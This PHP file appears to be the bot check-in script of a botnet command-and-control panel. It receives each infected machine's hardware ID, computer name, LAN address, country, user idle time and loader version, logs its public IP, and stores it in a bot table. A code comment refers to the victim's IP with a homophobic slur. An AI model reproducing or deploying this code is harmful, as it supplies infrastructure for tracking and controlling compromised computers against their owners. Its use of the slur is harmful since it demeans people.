<?php
	/**
		Author : DarkCoderSc
		This page is to INSERT/UPDATE a bot in db
	*/
	
	include('inc/connection.inc.php'); // we must include it there cuz we don't have our index that handle all includes
	
	/**
		Check if everything is fine to insert the new user in database
	*/
	if(
			isset($_GET['uid']) &&  isset($_GET['cmpname']) &&
	    isset($_GET['country']) &&  isset($_GET['cc']) &&
	    isset($_GET['idle']) && isset($_GET['lan']) &&
	    isset($_GET['ver'])
		){
			
   		$sock = getDBSock(); // get new database socket
  		
  		//Secure vars
  		$uid = mysql_real_escape_string(htmlspecialchars($_GET['uid'])); 					// Unic user identifier = HWID + First drive serial
  		$lan = mysql_real_escape_string(htmlspecialchars($_GET['lan'])); 					// IP adress local area network
  		$cmpname = mysql_real_escape_string(htmlspecialchars($_GET['cmpname']));	// Computer name
  		$country = mysql_real_escape_string(htmlspecialchars($_GET['country']));  // Computer country
  		$idle = mysql_real_escape_string(htmlspecialchars($_GET['idle']));				// Last user activity in seconds
  		$cc = mysql_real_escape_string(htmlspecialchars($_GET['cc']));						// Country Code #FR, #US etc...
  		$ver = mysql_real_escape_string(htmlspecialchars($_GET['ver']));					// Loader version
  		
  		$ip = $_SERVER['REMOTE_ADDR'];																						//Get the fag IP
  		$tstamp = time(); 																												//Get current timestamp
 
			/**
				Our big SQL query to insert/update a user
			*/
			$sql =  "INSERT INTO vn_users "; 
			$sql .= "VALUES('$lan','1','$ip','$cmpname','$country','$idle','$uid','$cc','$tstamp','$ver','') ";
			$sql .= "ON DUPLICATE KEY UPDATE lan='$lan', status='1', ip='$ip', cmpname='$cmpname', country='$country', ";
			$sql .= "idle='$idle', uid='$uid', CC='$cc', t_on='$tstamp', version='$ver'";
			
			//Execute de query			 
		  $result = mysql_query($sql, $sock) or die(mysql_error());
		  if (!$result) {
    		die('Grab error : '.mysql_error()); // Display sql error
			}
			
			mysql_close($sock); // flush mysql connection	
	}	
?>